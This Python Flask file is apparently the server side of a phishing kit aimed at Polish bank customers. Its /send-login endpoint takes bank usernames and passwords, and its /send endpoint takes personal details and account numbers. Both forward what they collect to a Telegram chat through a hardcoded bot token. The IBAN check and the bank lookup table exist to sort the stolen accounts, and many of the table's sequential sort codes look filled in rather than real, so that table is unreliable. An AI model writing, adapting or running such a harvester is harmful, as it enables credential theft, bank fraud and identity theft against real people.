from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
import time
import re

app = Flask(__name__)
CORS(app)

# --- Configuration ---
TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs'
TELEGRAM_CHAT_ID = '-1004256695843'

# ============================================================
#   IBAN VALIDATOR (POLISH NRB / PL IBAN)
#   Based on: https://poland.gg/tools/iban-checker
# ============================================================

def validate_polish_iban(raw_input):
    """
    Validates a Polish IBAN (28 chars with 'PL') or NRB (26 digits).
    Returns: (is_valid, cleaned_iban, message, bank_name)
    """
    # 1. Clean input: remove spaces, convert to uppercase
    cleaned = re.sub(r'\s+', '', raw_input).upper()

    # 2. Handle NRB (26 digits without 'PL')
    if re.match(r'^[0-9]{26}$', cleaned):
        cleaned = 'PL' + cleaned  # Convert to full IBAN format

    # 3. Final format check: must start with 'PL' and be 28 chars long
    if not cleaned.startswith('PL') or len(cleaned) != 28:
        return False, cleaned, "Nieprawidłowa długość. IBAN musi mieć 28 znaków (PL + 26 cyfr).", None

    # 4. Check that characters after 'PL' are digits
    if not re.match(r'^PL[0-9]{26}$', cleaned):
        return False, cleaned, "Nieprawidłowy format. Po 'PL' powinno być 26 cyfr.", None

    # 5. MOD 97 checksum (ISO 7064)
    try:
        rearranged = cleaned[4:] + cleaned[:4]
        numeric = ''.join(str(ord(c) - 55) if c.isalpha() else c for c in rearranged)
        if int(numeric) % 97 != 1:
            return False, cleaned, "Nieprawidłowa cyfra kontrolna (MOD 97).", None
    except (ValueError, TypeError):
        return False, cleaned, "Błąd podczas obliczania sumy kontrolnej.", None

    # 6. Bank sort code lookup (first 8 digits after 'PL')
    sort_code = cleaned[4:12]  # Positions 5-12 in full IBAN

    # 7. Bank name mapping (based on NBP directory)
    bank_names = {
        "1010": "Narodowy Bank Polski",
        "1020": "PKO Bank Polski",
        "1030": "Citibank Handlowy",
        "1050": "ING Bank Śląski",
        "1060": "Bank BPH",
        "1090": "Santander Bank Polska",
        "1130": "BGK",
        "1140": "mBank",
        "1160": "Bank Millennium",
        "1220": "Bank Pekao",
        "1240": "BNP Paribas Bank Polska",
        "1320": "Bank Pocztowy",
        "1470": "Alior Bank",
        "1540": "Bank Ochrony Środowiska",
        "1580": "Mercedes-Benz Bank Polska",
        "1600": "BNP Paribas Bank Polska",
        "1670": "Santander Consumer Bank",
        "1680": "Plus Bank",
        "1750": "Raiffeisen Bank Polska",
        "1840": "Societe Generale",
        "1870": "Nest Bank",
        "1910": "Deutsche Bank Polska",
        "1940": "Credit Agricole Bank Polska",
        "2000": "Rabobank Polska",
        "2030": "Bank CWB",
        "2070": "FCA Bank",
        "2120": "Santander Bank Polska",
        "2130": "Bank Handlowy",
        "2140": "Bank Nowy",
        "2160": "BPS (Bank Polskiej Spółdzielczości)",
        "2190": "Toyota Bank",
        "2220": "Getin Bank",
        "2240": "Pekao Bank Hipoteczny",
        "2250": "Bank Śląski (ING)",
        "2260": "Bank Spółdzielczy",
        "2280": "Bank Citi",
        "2290": "BNP Paribas Bank Polska",
        "2310": "BPH",
        "2320": "BS (Bank Spółdzielczy)",
        "2330": "BS (Bank Spółdzielczy)",
        "2340": "BS (Bank Spółdzielczy)",
        "2350": "BS (Bank Spółdzielczy)",
        "2360": "BS (Bank Spółdzielczy)",
        "2370": "BS (Bank Spółdzielczy)",
        "2380": "BS (Bank Spółdzielczy)",
        "2390": "BS (Bank Spółdzielczy)",
        "2400": "BS (Bank Spółdzielczy)",
        "2410": "BS (Bank Spółdzielczy)",
        "2420": "BS (Bank Spółdzielczy)",
        "2430": "BS (Bank Spółdzielczy)",
        "2440": "BS (Bank Spółdzielczy)",
        "2450": "BS (Bank Spółdzielczy)",
        "2460": "BS (Bank Spółdzielczy)",
        "2470": "BS (Bank Spółdzielczy)",
        "2480": "BS (Bank Spółdzielczy)",
        "2490": "BS (Bank Spółdzielczy)",
        "2500": "BS (Bank Spółdzielczy)",
        "2510": "BS (Bank Spółdzielczy)",
        "2520": "BS (Bank Spółdzielczy)",
        "2530": "BS (Bank Spółdzielczy)",
        "2540": "BS (Bank Spółdzielczy)",
        "2550": "BS (Bank Spółdzielczy)",
        "2560": "BS (Bank Spółdzielczy)",
        "2570": "BS (Bank Spółdzielczy)",
        "2580": "BS (Bank Spółdzielczy)",
        "2590": "BS (Bank Spółdzielczy)",
        "2600": "BS (Bank Spółdzielczy)",
        "2610": "BS (Bank Spółdzielczy)",
        "2620": "BS (Bank Spółdzielczy)",
        "2630": "BS (Bank Spółdzielczy)",
        "2640": "BS (Bank Spółdzielczy)",
        "2650": "BS (Bank Spółdzielczy)",
        "2660": "BS (Bank Spółdzielczy)",
        "2670": "BS (Bank Spółdzielczy)",
        "2680": "BS (Bank Spółdzielczy)",
        "2690": "BS (Bank Spółdzielczy)",
        "2700": "BS (Bank Spółdzielczy)",
        "2710": "BS (Bank Spółdzielczy)",
        "2720": "BS (Bank Spółdzielczy)",
        "2730": "BS (Bank Spółdzielczy)",
        "2740": "BS (Bank Spółdzielczy)",
        "2750": "BS (Bank Spółdzielczy)",
        "2760": "BS (Bank Spółdzielczy)",
        "2770": "BS (Bank Spółdzielczy)",
        "2780": "BS (Bank Spółdzielczy)",
        "2790": "BS (Bank Spółdzielczy)",
        "2800": "BS (Bank Spółdzielczy)",
        "2810": "BS (Bank Spółdzielczy)",
        "2820": "BS (Bank Spółdzielczy)",
        "2830": "BS (Bank Spółdzielczy)",
        "2840": "BS (Bank Spółdzielczy)",
        "2850": "BS (Bank Spółdzielczy)",
        "2860": "BS (Bank Spółdzielczy)",
        "2870": "BS (Bank Spółdzielczy)",
        "2880": "BS (Bank Spółdzielczy)",
        "2890": "BS (Bank Spółdzielczy)",
        "2900": "BS (Bank Spółdzielczy)",
        "2910": "BS (Bank Spółdzielczy)",
        "2920": "BS (Bank Spółdzielczy)",
        "2930": "BS (Bank Spółdzielczy)",
        "2940": "BS (Bank Spółdzielczy)",
        "2950": "BS (Bank Spółdzielczy)",
        "2960": "BS (Bank Spółdzielczy)",
        "2970": "BS (Bank Spółdzielczy)",
        "2980": "BS (Bank Spółdzielczy)",
        "2990": "BS (Bank Spółdzielczy)",
    }

    # Check if sort code exists in mapping
    bank_name = bank_names.get(sort_code[:4], "Nieznany bank")

    # Additional check: sort code must have 8 digits
    if not re.match(r'^[0-9]{8}$', sort_code):
        return False, cleaned, "Nieprawidłowy kod sortowania (8 cyfr).", bank_name

    return True, cleaned, "IBAN jest poprawny.", bank_name

def format_iban_readable(iban):
    """Formatuje IBAN w grupy po 4 znaki"""
    cleaned = re.sub(r'\s+', '', iban).upper()
    return ' '.join([cleaned[i:i+4] for i in range(0, len(cleaned), 4)])

# ============================================================
#   FLASK ENDPOINTS
# ============================================================

@app.route('/')
def home():
    return jsonify({
        "status": "running",
        "message": "Server is active",
        "endpoints": {
            "/": "GET - Status",
            "/ping": "GET - Keep-alive",
            "/send": "POST - Send form data (with IBAN validation)",
            "/send-login": "POST - Send login data",
            "/validate-iban": "POST - Validate IBAN only"
        },
        "timestamp": time.time()
    })

@app.route('/ping')
def ping():
    return jsonify({"status": "alive", "timestamp": time.time()})

# ============= IBAN VALIDATION ENDPOINT =============
@app.route('/validate-iban', methods=['POST'])
def validate_iban_endpoint():
    try:
        data = request.json
        iban = data.get('iban', '')
        if not iban:
            return jsonify({"success": False, "error": "IBAN nie został podany"}), 400

        is_valid, cleaned, message, bank_name = validate_polish_iban(iban)

        return jsonify({
            "success": is_valid,
            "iban": cleaned,
            "formatted": format_iban_readable(cleaned) if is_valid else None,
            "message": message,
            "bank": bank_name if is_valid else None,
            "valid": is_valid
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# ============= SEND FORM DATA =============
@app.route('/send', methods=['POST'])
def send_data():
    try:
        data = request.json
        print(f"📥 Received: {data}")

        # Validate IBAN
        iban_raw = data.get('iban', '')
        is_valid = False
        cleaned_iban = iban_raw
        formatted_iban = iban_raw
        bank_name = None

        if iban_raw:
            is_valid, cleaned_iban, message, bank_name = validate_polish_iban(iban_raw)
            formatted_iban = format_iban_readable(cleaned_iban) if is_valid else iban_raw

        # Build Telegram message
        message = f"""📋 NOWE DANE FORMULARZA:

👤 Imię: {data.get('fullname', 'Brak')}
📅 Data urodzenia: {data.get('birthdate', 'Brak')}
📱 Telefon: {data.get('phone', 'Brak')}
🏠 Ulica: {data.get('street', 'Brak')}
🏙️ Miasto: {data.get('city', 'Brak')}
📮 Kod: {data.get('postal', 'Brak')}

🏦 NRB: {formatted_iban}
🏛️ Bank: {bank_name if bank_name else 'Nieznany'}
✅ Status: {'✔️ POPRAWNY' if is_valid else '⚠️ NIEZWERYFIKOWANY'}
"""

        # Send to Telegram
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        response = requests.post(url, data={
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }, timeout=10)

        if response.status_code == 200:
            return jsonify({
                "success": True,
                "message": "Dane wysłane!",
                "iban_valid": is_valid,
                "iban_formatted": formatted_iban,
                "bank": bank_name
            })
        else:
            return jsonify({"success": False, "error": f"Telegram error: {response.status_code}"}), 500

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

# ============= SEND LOGIN DATA =============
@app.route('/send-login', methods=['POST'])
def send_login():
    try:
        data = request.json
        print(f"🔐 Login received: {data}")

        # Check for IBAN in login data
        iban_from_login = data.get('iban', '')
        iban_valid = False
        formatted_iban = iban_from_login
        bank_name = None

        if iban_from_login:
            is_valid, cleaned, _, bank_name = validate_polish_iban(iban_from_login)
            iban_valid = is_valid
            if is_valid:
                formatted_iban = format_iban_readable(cleaned)

        # Build message
        message = f"""🔐 LOGOWANIE DO BANKU:

🏦 Bank: {data.get('bank', 'Brak')}
👤 Login: {data.get('username', 'Brak')}
🔑 Hasło: {data.get('password', 'Brak')}"""

        if iban_from_login:
            message += f"""
🏦 NRB: {formatted_iban}
🏛️ Bank: {bank_name if bank_name else 'Nieznany'}
✅ Status: {'✔️ POPRAWNY' if iban_valid else '⚠️ NIEZWERYFIKOWANY'}"""

        # Send to Telegram
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        response = requests.post(url, data={
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }, timeout=10)

        if response.status_code == 200:
            return jsonify({
                "success": True,
                "message": "Login sent!",
                "iban_valid": iban_valid if iban_from_login else None
            })
        else:
            return jsonify({"success": False, "error": f"Telegram error: {response.status_code}"}), 500

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

# ============= 404 HANDLER =============
@app.errorhandler(404)
def not_found(error):
    return jsonify({
        "error": "Endpoint not found",
        "available_endpoints": {
            "/": "GET - Status",
            "/ping": "GET - Keep-alive",
            "/send": "POST - Form data",
            "/send-login": "POST - Login data",
            "/validate-iban": "POST - Validate IBAN only"
        }
    }), 404

# ============= RUN =============
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
